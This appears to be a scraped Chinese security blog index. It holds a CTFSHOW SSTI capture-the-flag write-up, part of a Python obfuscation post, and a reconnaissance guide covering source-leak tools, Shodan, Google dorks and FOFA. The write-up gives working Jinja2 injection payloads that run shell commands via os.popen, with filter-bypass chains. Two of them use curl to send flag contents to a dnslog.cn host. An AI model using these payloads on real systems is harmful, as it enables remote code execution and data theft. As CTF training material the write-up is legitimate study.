class="line">(<span class="built_in">chr</span>(<span class="number">37</span>)+<span class="built_in">str</span>(&#123;&#125;.__class__)[<span class="number">1</span>])%<span class="number">100</span> == <span class="string">&#x27;d&#x27;</span>  <span class="comment"># (%c)%100</span></span><br></pre></td></tr></table></figure><ul><li><code>dict()</code> 拿键</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;whoami&#x27;</span> ==</span><br><span class="line"><span class="built_in">list</span>(<span class="built_in">dict</span>(whoami=<span class="number">1</span>))[<span class="number">0</span>] ==</span><br><span class="line"><span class="built_in">str</span>(<span class="built_in">dict</span>(whoami=<span class="number">1</span>))[<span class="number">2</span>:<span class="number">8</span>] ==</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFSHOW-SSTI</title>
      <link href="/2023/07/28/CTFSHOW-SSTI/"/>
      <url>/2023/07/28/CTFSHOW-SSTI/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="web361-无过滤"><a href="#web361-无过滤" class="headerlink" title="web361(无过滤)"></a>web361(无过滤)</h1><p>当<code>?name=&#123;&#123;7*7&#125;&#125;</code>时，发现被执行，发现存在SSTI模板注入</p><p>通过<code>&#123;&#123;''.__class__.__base__.__subclasses__()&#125;&#125;</code>将相关子类找出来，利用脚本将我们想要的os模块查找出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="built_in">input</span>(<span class="string">&#x27;请输入URL链接：&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url=url+<span class="string">&#x27;?name=&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;]&#125;&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;os._wrap_close&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>输出132，构造payload</p><p><code>payload: ?name=&#123;&#123;''.__class__.__base__.__subclasses__()[132].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")&#125;&#125;</code></p><h1 id="web362-过滤数字"><a href="#web362-过滤数字" class="headerlink" title="web362(过滤数字)"></a>web362(过滤数字)</h1><p>尝试用上题的payload试一下，发现过滤了数字（2，3等）</p><p>可以利用<code>url_for</code>调用os模块</p><p><code>payload: ?name=&#123;&#123;url_for.__globals__.os.popen('cat /flag').read()&#125;&#125;</code></p><h1 id="web363-过滤单双引号"><a href="#web363-过滤单双引号" class="headerlink" title="web363(过滤单双引号)"></a>web363(过滤单双引号)</h1><p>测试之后发现，本题过滤了单双引号</p><p>可以利用request函数进行绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request.args.key<span class="comment"># 获取get传入的key的值</span></span><br><span class="line">request.values.x1<span class="comment"># 所有参数</span></span><br><span class="line">request.cookies<span class="comment"># 获取cookies传入参数</span></span><br><span class="line">request.headers<span class="comment"># 获取请求头请求参数</span></span><br><span class="line">requests.form.key<span class="comment"># 获取post传入参数（Content-Type: application/x-www-form-urlencoded或multipart/form-data）</span></span><br><span class="line">request.data<span class="comment"># 获取post传入参数（Content-Type: a/b）</span></span><br><span class="line">request.json<span class="comment"># 获取post传入json参数（Content-Type: application/json）</span></span><br></pre></td></tr></table></figure><p><code>payload: ?name=&#123;&#123;url_for.__globals__.os.popen(request.args.key).read()&#125;&#125;&amp;key=cat /flag</code></p><h1 id="web364-过滤关键字-amp-单双引号"><a href="#web364-过滤关键字-amp-单双引号" class="headerlink" title="web364(过滤关键字&amp;单双引号)"></a>web364(过滤关键字&amp;单双引号)</h1><p>试了好久，感觉像是过滤了单双引号还有args</p><p>可以利用request中的cookie进行绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">request.args.key<span class="comment"># 获取get传入的key的值</span></span><br><span class="line">request.values.x1<span class="comment"># 所有参数</span></span><br><span class="line">request.cookies<span class="comment"># 获取cookies传入参数</span></span><br><span class="line">request.headers<span class="comment"># 获取请求头请求参数</span></span><br><span class="line">requests.form.key<span class="comment"># 获取post传入参数（Content-Type: application/x-www-form-urlencoded或multipart/form-data）</span></span><br><span class="line">request.data<span class="comment"># 获取post传入参数（Content-Type: a/b）</span></span><br><span class="line">request.json<span class="comment"># 获取post传入json参数（Content-Type: application/json）</span></span><br></pre></td></tr></table></figure><p><code>payload: ?name=&#123;&#123;url_for.__globals__.os.popen(request.cookies.key).read()&#125;&#125;    Cookie: key=cat /flag</code></p><h1 id="web365-过滤关键字-amp-单双引号"><a href="#web365-过滤关键字-amp-单双引号" class="headerlink" title="web365(过滤关键字&amp;单双引号)"></a>web365(过滤关键字&amp;单双引号)</h1><p>过滤了单双引号还有args</p><p>上题的payload可以直接用</p><p><code>payload: ?name=&#123;&#123;url_for.__globals__.os.popen(request.cookies.key).read()&#125;&#125;    Cookie: key=cat /flag</code></p><h1 id="web366-过滤中括号，下划线，单双引号"><a href="#web366-过滤中括号，下划线，单双引号" class="headerlink" title="web366(过滤中括号，下划线，单双引号)"></a>web366(过滤中括号，下划线，单双引号)</h1><p>过滤了中括号，下划线，单双引号等</p><p>可以利用过滤器进行绕过</p><blockquote><p><code>length()</code> 获取一个序列或者字典的长度并将其返回</p><p><code>int()</code> 将值转换为int类型</p><p><code>float()</code> 将值转换为float类型</p><p><code>lower()</code> 将字符串转换为小写</p><p><code>upper()</code> 将字符串转换为大写</p><p><code>reverse()</code> 反转字符串</p><p><code>replace(value,old,new)</code> 将value中的old替换为new</p><p><code>list()</code> 将变量转换为列表类型</p><p><code>string()</code> 将变量转换成字符串类型</p><p><code>join()</code> 将一个序列中的参数值拼接成字符串，通常由pytohn内置的dict()配合使用</p><p><code>attr()</code> 获取对象的属性</p></blockquote><p>本题使用attr进行绕过</p><p><code>payload: ?name=&#123;&#123;(lipsum|attr(request.values.glo)).os.popen(request.values.pay).read()&#125;&#125;&amp;glo=__globals__&amp;pay=cat /flag</code></p><h1 id="web367-过滤os"><a href="#web367-过滤os" class="headerlink" title="web367(过滤os)"></a>web367(过滤os)</h1><p>反复测试，发现过滤了os</p><p>利用get获取os的值</p><p> <code>payload: ?name=&#123;&#123;(lipsum|attr(request.values.glo)).get(request.values.o).popen(request.values.pay).read()&#125;&#125;&amp;glo=__globals__&amp;o=os&amp;pay=cat /flag</code></p><h1 id="web368-过滤"><a href="#web368-过滤" class="headerlink" title="web368(过滤{)"></a>web368(过滤{)</h1><p>发现过滤了<code>&#123;</code>，可以使用<code>&#123; %</code></p><p><strong>payload: </strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% print</span><br><span class="line">(lipsum|attr(request.values.glo)).get(request.values.o).popen(request.values.pay).read()%&#125;&amp;glo=__globals__&amp;o=os&amp;pay=cat /flag</span><br></pre></td></tr></table></figure><h1 id="web369-过滤request"><a href="#web369-过滤request" class="headerlink" title="web369(过滤request)"></a>web369(过滤request)</h1><p>过滤了<code>request</code></p><p>可以使用一些特殊的方法进行绕过</p><p>以<code>__class__</code>为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 字符编码</span><br><span class="line">2. 最简单拼接&quot;+&quot;：&#x27;__cl&#x27;+&#x27;ass__&#x27;</span><br><span class="line">3. 使用jinja2的~进行拼接：&#123;%set a=&quot;__cla&quot;%&#125;&#123;%set b=&quot;ss_&quot;%&#125;&#123;&#123;()a~b&#125;&#125;</span><br><span class="line">4. 使用过滤器(reverse反转、replace替换、join拼接等)：&#123;%set a=&quot;__ssacl__&quot;|reverse%&#125;&#123;&#123;a&#125;&#125;</span><br><span class="line">5. 利用python的char()：&#123;%set chr=url_for.globals__[&#x27;__builtins__&#x27;].chr%&#125;&#123;&#123;&quot;&quot;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]&#125;&#125;</span><br></pre></td></tr></table></figure><p>利用过滤器及上述方法自行构造</p><p><code>paylaod:</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% set po=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set a=(()|select|string|list)|attr(po)(24)%&#125;</span><br><span class="line">&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% set chr=x.chr%&#125;</span><br><span class="line">&#123;% set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%&#125;</span><br><span class="line">&#123;%print(x.open(file).read())%&#125;</span><br></pre></td></tr></table></figure><h1 id="web370-过滤数字"><a href="#web370-过滤数字" class="headerlink" title="web370(过滤数字)"></a>web370(过滤数字)</h1><p>过滤了数字，可以利用count过滤器绕过数字过滤</p><p><code>payload:</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;% set c=(dict(e=a)|join|count)%&#125;</span><br><span class="line">&#123;% set cc=(dict(ee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set ccc=(dict(eee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set cccc=(dict(eeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set ccccccc=(dict(eeeeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set cccccccc=(dict(eeeeeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set ccccccccc=(dict(eeeeeeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set cccccccccc=(dict(eeeeeeeeee=a)|join|count)%&#125;</span><br><span class="line">&#123;% set coun=(cc~cccc)|int%&#125;</span><br><span class="line">&#123;% set po=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set a=(()|select|string|list)|attr(po)(coun)%&#125;</span><br><span class="line">&#123;% set ini=(a,a,dict(init=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set glo=(a,a,dict(globals=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set built=(a,a,dict(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% set chr=x.chr%&#125;</span><br><span class="line">&#123;% set file=chr((cccc~ccccccc)|int)%2bchr((cccccccccc~cc)|int)%2bchr((cccccccccc~cccccccc)|int)%2bchr((ccccccccc~ccccccc)|int)%2bchr((cccccccccc~ccc)|int)%&#125;</span><br><span class="line">&#123;%print(x.open(file).read())%&#125;</span><br></pre></td></tr></table></figure><h1 id="web371-无回显"><a href="#web371-无回显" class="headerlink" title="web371(无回显)"></a>web371(无回显)</h1><p>过滤了print，用反弹shell（这里使用dnslog外带）</p><p>payload：</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%set a=dict(po=aa,p=aa)|join%&#125;&#123;%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|count%&#125;&#123;%set k=dict(eeeeeeeee=a)|join|count%&#125;&#123;%set l=dict(eeeeeeee=a)|join|count%&#125;&#123;%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|count%&#125;&#123;%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|count%&#125;&#123;% set b=(lipsum|string|list)|attr(a)(j)%&#125;&#123;%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125;&#123;%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%&#125;&#123;%set e=dict(o=cc,s=aa)|join%&#125;&#123;% set f=(lipsum|string|list)|attr(a)(k)%&#125;&#123;%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;&#123;%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;&#123;%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;&#123;%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(czcoqr=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%&#125;&#123;%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;XiLitter&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>使用时只需替换域名即可，执行后刷新dnslog</p><h1 id="web372-过滤count"><a href="#web372-过滤count" class="headerlink" title="web372(过滤count)"></a>web372(过滤count)</h1><p>可以考虑用length代替count</p><p><code>payload:</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;%set a=dict(po=aa,p=aa)|join%&#125;&#123;%set j=dict(eeeeeeeeeeeeeeeeee=a)|join|length%&#125;&#123;%set k=dict(eeeeeeeee=a)|join|length%&#125;&#123;%set l=dict(eeeeeeee=a)|join|length%&#125;&#123;%set n=dict(eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee=a)|join|length%&#125;&#123;%set m=dict(eeeeeeeeeeeeeeeeeeee=a)|join|length%&#125;&#123;% set b=(lipsum|string|list)|attr(a)(j)%&#125;&#123;%set c=(b,b,dict(glob=cc,als=aa)|join,b,b)|join%&#125;&#123;%set d=(b,b,dict(getit=cc,em=aa)|join,b,b)|join%&#125;&#123;%set e=dict(o=cc,s=aa)|join%&#125;&#123;% set f=(lipsum|string|list)|attr(a)(k)%&#125;&#123;%set g=(((lipsum|attr(c))|attr(d)(e))|string|list)|attr(a)(-l)%&#125;&#123;%set p=((lipsum|attr(c))|string|list)|attr(a)(n)%&#125;&#123;%set q=((lipsum|attr(c))|string|list)|attr(a)(m)%&#125;&#123;%set i=(dict(curl=aa)|join,f,p,dict(cat=a)|join,f,g,dict(flag=aa)|join,p,q,dict(owlptl=a)|join,q,dict(dnslog=a)|join,q,dict(cn=a)|join)|join%&#125;&#123;%if ((lipsum|attr(c))|attr(d)(e)).popen(i)%&#125;XiLitter&#123;%endif%&#125;</span><br></pre></td></tr></table></figure><p>更新dnslog数据即可</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFSHOW </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息搜集</title>
      <link href="/2023/07/26/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"/>
      <url>/2023/07/26/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<span id="more"></span><h1 id="信息搜集概述及分类"><a href="#信息搜集概述及分类" class="headerlink" title="信息搜集概述及分类"></a>信息搜集概述及分类</h1><h2 id="搜集内容"><a href="#搜集内容" class="headerlink" title="搜集内容"></a>搜集内容</h2><ul><li>IP地址、公司地址、邮件地址</li><li>域名信息、端口信息、敏感信息、主机存活情况</li><li>联系电话</li><li>网站架构技术</li><li>……</li></ul><h2 id="信息搜集分类"><a href="#信息搜集分类" class="headerlink" title="信息搜集分类"></a>信息搜集分类</h2><h3 id="主动信息搜集"><a href="#主动信息搜集" class="headerlink" title="主动信息搜集"></a>主动信息搜集</h3><p>需要与目标机器进行直接交互</p><p><strong>缺点：</strong>容易被目标机器记录操作信息或者屏蔽</p><p>比如：nmap、Scapy</p><h3 id="被动信息搜集"><a href="#被动信息搜集" class="headerlink" title="被动信息搜集"></a>被动信息搜集</h3><p>不需要与目标机器进行交互，主要利用第三站点或渠道来进行信息的收集</p><p>比如：google、shodan、fofa</p><h1 id="敏感目录泄露"><a href="#敏感目录泄露" class="headerlink" title="敏感目录泄露"></a>敏感目录泄露</h1><h2 id="git泄露"><a href="#git泄露" class="headerlink" title="git泄露"></a>git泄露</h2><p>git是一个主流的分布式版本控制系统，开发人员在开发过程中经常会遗忘<code>.git</code>文件夹，导致攻击者可以通过<code>.git</code>文件夹中的信息获取开发人员提交过的所有源码，进而导致服务器被攻击。</p><blockquote><p>工具<a href="https://github.com/denny0223/scrabble">scrabble</a></p><p>使用方法：<code>./scrabble http://www.example.com</code></p><p>工具<a href="https://github.com/WangYiHang/GitHacker">GitHacker</a></p><p>使用方法：<code>python GitHacker.py http://www.example.com/.git/</code></p></blockquote><h2 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h2><p>SVN是源代码版本管理软件，造成SVN源代码漏洞的主要原因是管理员操作不规范将SVN隐藏文件夹暴露于外网环境，可以利用<code>.svn/entries</code>或<code>wc.db</code>文件获取服务器源码等信息。</p><blockquote><p>工具<a href="https://gitcode.net/mirrors/kost/dvcs-ripper?utm_source=csdn_github_accelerator">dvcs-ripper</a></p><p>使用方法：<code>./rip-svn.pl -u http://www.example.com/.svn</code></p></blockquote><h2 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h2><p>在初始化项目时，HG会在当前文件夹创建一个<code>.hg</code>隐藏文件夹，其中包含代码和分支修改记录等信息。</p><blockquote><p>工具<a href="https://gitcode.net/mirrors/kost/dvcs-ripper?utm_source=csdn_github_accelerator">dvcs-ripper</a></p><p>使用方法：<code>./rip-hg.pl -v -u http://www.example.com/.hg</code></p></blockquote><h2 id="DS-Store-源码泄漏"><a href="#DS-Store-源码泄漏" class="headerlink" title="DS_Store 源码泄漏"></a>DS_Store 源码泄漏</h2><p>在发布代码时，没有删除文件夹中隐藏的<code>.DS_store</code>，被发现后，获取了敏感的文件名等信息。</p><blockquote><p>工具<a href="https://github.com/lijiejie/ds_store_exp">ds_store_exp</a></p><p>使用方法：<code>python ds_store_exp.py http://www.example.com/.DS_Store</code></p></blockquote><h1 id="敏感备份文件"><a href="#敏感备份文件" class="headerlink" title="敏感备份文件"></a>敏感备份文件</h1><h2 id="gedit备份文件"><a href="#gedit备份文件" class="headerlink" title="gedit备份文件"></a>gedit备份文件</h2><p>在Linux下，，用gedit编辑器保存后，当前目录下会生成后缀为<code>~</code>的文件，其文件内容就是刚编辑的内容，通过浏览器访问这个带有<code>~</code>的文件，便可以的源代码。</p><h2 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h2><p>vim是目前运用得最多的Linux编辑器，当用户在编辑文件但意外退出时（如通过SSH来连接服务器时，在用vim编辑文件的过程中可能遇到因为网速不够导致的命令行卡死而意外退出的情况），会在当前目录下生成一个备份文件，文件名格式为：<code>.文件名.swp</code>，该文件用来备份缓冲区中的内容即将退出时的文件内容。针对SWP备份文件，可以用<code>vim -r</code>命令恢复文件的内容。</p><h2 id="常规文件"><a href="#常规文件" class="headerlink" title="常规文件"></a>常规文件</h2><ul><li><code>robots.txt</code>：记录一些目录和CMS版本信息</li><li><code>readme.md</code>：记录CMS版本信息，有的甚至有Github地址</li><li><code>www.zip/rar/tar.gz</code>：往往是网站的源码备份</li></ul><h1 id="Shodan搜索引擎使用方法"><a href="#Shodan搜索引擎使用方法" class="headerlink" title="Shodan搜索引擎使用方法"></a>Shodan搜索引擎使用方法</h1><p><a href="https://www.shodan.io/">https://www.shodan.io/</a></p><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><p>这里就像是用其他搜索引擎一样，在主页的搜索框中输入想要搜索的内容即可，例如下面搜索 “github”：</p><p><img src="/img/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/shodan_01.png" alt=""></p><p>上图的搜索结果包含两个部分，左侧是大量的汇总数据包括：</p><ul><li>TOTAL RESULTS – 搜索结果总数</li><li>TOP COUNTRIES – 排名靠前的国家</li><li>Top Ports – 使用最多的端口</li><li>Top organizations – 使用最多的组织</li><li>Top products – 使用最多的产品名称</li><li>Top operating systems – 使用最多的操作系统</li></ul><p>随后，在中间的主页面我们可以看到包含如下的搜索结果：</p><ul><li>IP 地址</li><li>主机名</li><li>ISP</li><li>该条目的收录时间</li><li>该主机位于的国家</li><li>Banner 信息、</li></ul><p>想要了解每个条目的具体信息，只需要点击每个条目的IP地址来查看详细信息。</p><h2 id="使用搜索过滤"><a href="#使用搜索过滤" class="headerlink" title="使用搜索过滤"></a>使用搜索过滤</h2><p>使用搜索过滤，能更加准确的搜索出我们想要的的内容，常见的过滤命令如下所示：</p><ul><li>hostname：搜索指定的主机或域名，例如 hostname:“google”</li><li>port：搜索指定的端口或服务，例如 port:“22”</li><li>country：搜索指定的国家，例如 country:“CN”</li><li>city：搜索指定的城市，例如 city:“dalian”</li><li>org：搜索指定的组织或公司，例如 org:“google”</li><li>isp：搜索指定的ISP供应商，例如 isp:“China Telecom”</li><li>product：搜索指定的操作系统/软件/平台，例如 product:“Apache httpd”</li><li>version：搜索指定的软件版本，例如 version:“1.6.2”</li><li>geo：搜索指定的地理位置，参数为经纬度，例如 geo:“31.8639, 117.2808”</li><li>before/after：搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:“11-11-15”</li><li>net：搜索指定的IP地址或子网，例如 net:“210.45.240.0/24”</li></ul><h1 id="Google搜索引擎使用方法"><a href="#Google搜索引擎使用方法" class="headerlink" title="Google搜索引擎使用方法"></a>Google搜索引擎使用方法</h1><p><a href="https://www.google.com/">https://www.google.com/</a></p><p>常见的 Google 关键字</p><ul><li>site：指定域名</li><li>inurl：URL中存在关键字页面</li><li>intext：网页内容里面的关键字</li><li>filetype：指定文件类型</li><li>intitle：网页标题中的关键字</li><li>link：返回所有的指定域名链接</li><li>info：查找指定站点信息</li><li>cache：搜索Google里的内容缓存</li><li>-关键字：不希望搜索结果中出现包含该关键字的网页</li></ul><p><strong>组合使用</strong></p><p>举例：</p><ol><li><p>在指定站点寻找上传页面<br><code>site: xx.com inurl: file</code><br><code>site: xx.com inurl: load</code></p></li><li><p>搜索重要文件<br><code>site: xx.com inurl: robots.txt</code></p></li><li>搜索注入点<br><code>inurl: php?id=</code></li><li>搜索敏感信息<br><code>intitle: 管理|登录|后台</code></li><li>查询包含 <code>user.sql</code> 用户数据库信息的页面<br><code>intext: user.sql intitle: index.of</code> (index.of表示网站目录是开放状态)</li></ol><p><strong>总结</strong></p><p><a href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a></p><h1 id="FOFA搜索引擎使用方法"><a href="#FOFA搜索引擎使用方法" class="headerlink" title="FOFA搜索引擎使用方法"></a>FOFA搜索引擎使用方法</h1><p><a href="https://fofa.info/">FOFA网络空间测绘系统</a></p><blockquote><p>直接输入查询语句，将从标题，html内容，http头信息，url字段中搜索；</p><p>如果查询表达式有多个与或关系，尽量在外面用（）包含起来；</p><p>新增<code>==</code>完全匹配的符号，可以加快搜索速度，比如查找qq.com所有host，可以是domain==”qq.com”</p></blockquote><h2 id="高级搜索"><a href="#高级搜索" class="headerlink" title="高级搜索"></a>高级搜索</h2><div class="table-container"><table><thead><tr><th>逻辑连接符</th><th>具体含义</th></tr></thead><tbody><tr><td>=</td><td>匹配，=””时，可查询不存在字段或者值为空的情况。</td></tr><tr><td>==</td><td>完全匹配，==””时，可查询存在且值为空的情况。</td></tr><tr><td>&amp;&amp;</td><td>与</td></tr><tr><td>\</td><td>\</td><td></td><td>或者</td></tr><tr><td>!=</td><td>不匹配，!=””时，可查询值为空的情况。</td></tr><tr><td>*=</td><td>模糊匹配，使用<em>或者?进行搜索，比如banner</em>=”mys??” (个人版及以上可用)。</td></tr><tr><td>()</td><td>确认查询优先级，括号内容优先级最高。</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>例句</th><th>用途</th></tr></thead><tbody><tr><td>title=”beijing”</td><td>从标题中搜索“北京”</td></tr><tr><td>header=”elastic”</td><td>从http头中搜索“elastic”</td></tr><tr><td>body=”网络空间测绘”</td><td>从html正文中搜索“网络空间测绘”</td></tr><tr><td>fid=”sSXXGNUO2FefBTcCLIT/2Q==”</td><td>查找相同的网站指纹</td></tr><tr><td>domain=”qq.com”</td><td>搜索根域名带有qq.com的网站</td></tr><tr><td>icp=”京ICP证030173号”</td><td>查找备案号为“京ICP证030173号”的网站</td></tr><tr><td>js_name=”js/jquery.js”</td><td>查找网站正文中包含js/jquery.js的资产</td></tr><tr><td>cname=”ap21.inst.siteforce.com”</td><td>查找cname为”ap21.inst.siteforce.com”的网站</td></tr><tr><td>cname_domain=”siteforce.com”</td><td>查找cname为”ap21.inst.siteforce.com”的网站</td></tr><tr><td>cname_domain=”siteforce.com”</td><td>从url中搜索”.gov.cn”</td></tr><tr><td>port=”6379”</td><td>port=”6379”</td></tr><tr><td>ip=”1.1.1.1”</td><td>从ip中搜索包含“1.1.1.1”的网站</td></tr><tr><td>status_code=”402”</td><td>查询服务器状态为“402”的资产</td></tr><tr><td>查询服务器状态为“402”的资产</td><td>查询服务器状态为“402”的资产</td></tr><tr><td>city=”Ürümqi”</td><td>搜索指定城市的资产</td></tr><tr><td>after=”2017” &amp;&amp; 